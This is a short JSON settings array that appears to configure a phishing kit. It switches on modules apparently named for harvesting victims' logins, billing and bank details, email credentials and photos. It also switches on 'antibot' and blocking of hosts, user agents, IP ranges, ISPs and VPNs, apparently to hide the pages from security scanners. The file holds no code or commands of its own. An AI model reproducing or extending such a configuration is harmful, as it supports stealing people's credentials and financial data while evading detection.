[{"function":"antibot","status":"on"},{"function":"send_login","status":"on"},{"function":"get_billing","status":"on"},{"function":"get_photo","status":"on"},{"function":"get_bank","status":"on"},{"function":"get_email","status":"on"},{"function":"onetime","status":"on"},{"function":"block_host","status":"on"},{"function":"block_ua","status":"on"},{"function":"block_iprange","status":"on"},{"function":"block_isp","status":"on"},{"function":"block_vpn","status":"on"},{"function":"block_referrer","status":"off"}]